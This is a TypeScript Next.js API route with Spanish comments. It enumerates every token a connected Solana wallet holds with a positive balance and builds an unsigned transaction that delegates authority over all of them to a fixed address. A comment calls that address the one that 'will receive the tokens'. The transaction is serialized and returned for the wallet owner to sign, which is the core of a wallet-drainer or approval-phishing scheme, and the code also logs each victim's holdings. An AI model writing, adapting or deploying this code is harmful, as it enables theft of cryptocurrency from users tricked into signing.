import { NextResponse } from "next/server";
import { Connection, PublicKey } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { createUmi } from "@metaplex-foundation/umi-bundle-defaults";
import { mplTokenMetadata, fetchDigitalAsset } from "@metaplex-foundation/mpl-token-metadata";
import { fromWeb3JsPublicKey } from "@metaplex-foundation/umi-web3js-adapters";
import { createDelegateAuthorityTransaction } from "@/lib/createDelegateAuthorityTransaction";

enum SolanaRPC {
  // Connection = "https://api.devnet.solana.com",
  // Connection = "https://api.testnet.solana.com",
  Connection = "https://api.mainnet-beta.solana.com",
  // Connection = "http://localhost:8899",
}

const umi = createUmi(SolanaRPC.Connection).use(mplTokenMetadata());

// Dirección que recibirá los tokens
const DELEGATE_ADDRESS = new PublicKey("");

async function getTokenMetadata(mint: PublicKey) {
  try {
    const umiPk = fromWeb3JsPublicKey(mint);
    const asset = await fetchDigitalAsset(umi, umiPk);
    return {
      name: asset.metadata.name ?? "Unknown",
      symbol: asset.metadata.symbol ?? "Unknown",
      decimals: asset.mint.decimals ?? 0,
    };
  } catch {
    return { name: "Unknown", symbol: "Unknown", decimals: 0 };
  }
}

// Recibir la pubkey conectada desde el cliente 

export async function POST(req: Request) {
  try {
    const body = await req.json();
    
    if (!body.owner) throw new Error("No se recibió la wallet del usuario");
    const owner = new PublicKey(body.owner);
    
    const connection = new Connection(SolanaRPC.Connection, "confirmed");
    
    const tokens = [];

    // Agregar SOL al arreglo de tokens

    // const lamports = await connection.getBalance(owner, "confirmed");
    // const solAmount = lamports / 1e9; 
    
    // if (solAmount > 0) {
    //   tokens.push({
    //     tokenAccount: owner.toBase58(),
    //     mint: "11111111111111111111111111111111",
    //     name: "Solana",
    //     symbol: "SOL",
    //     amount: solAmount,
    //   });
    // }
    
    // Obtener cuentas que le pertenecen a la pubkey
    const response = await connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_PROGRAM_ID,
    });

    // Filtar cuentas por saldo
    const positiveAccounts = response.value.filter(
      (acc) => parseInt(acc.account.data.parsed.info.tokenAmount.amount) > 0
    );

    if (positiveAccounts.length === 0) {
      return NextResponse.json({ tokens: [], serializedTx: null });
    }

    for (const acc of positiveAccounts) {
      const info = acc.account.data.parsed.info;
      const mintPk = new PublicKey(info.mint);
      const metadata = await getTokenMetadata(mintPk);

      const amount =
        parseInt(info.tokenAmount.amount) /
        Math.pow(10, info.tokenAmount.decimals || 
      metadata.decimals);

      tokens.push({
        tokenAccount: acc.pubkey.toBase58(),
        mint: mintPk.toBase58(),
        name: metadata.name,
        symbol: metadata.symbol,
        amount,
      });

      console.log("====================");
      console.log(`✅ Cuenta con saldo positivo: ${tokens.length}`);
      console.log("====================");
      console.log(`🙋‍♂️ Owner (Pubkey): ${owner}` );
      console.log(`💎 Mint (Token ID): ${mintPk.toBase58()}`);
      console.log(`🏷️ Nombre del Token: ${metadata.name}`);
      console.log(`💰 Cantidad (Raw): ${amount}`);
    }

    // Crear transacción de delegación
    const transaction = createDelegateAuthorityTransaction(tokens, owner, DELEGATE_ADDRESS);

    // Asignar feePayer y recentBlockhash
    transaction.feePayer = owner;
    const { blockhash } = await connection.getLatestBlockhash("confirmed");
    transaction.recentBlockhash = blockhash;

    // Serializar para enviar al cliente
    const serializedTx = transaction.serialize({ requireAllSignatures: false }).toString("base64");

    return NextResponse.json({ tokens, serializedTx });
    
  } catch (err: any) {
    console.error("ERROR EN /api/tokens:", err);
    return NextResponse.json({ error: err.message || "Error processing tokens" }, { status: 500 });
  }
}
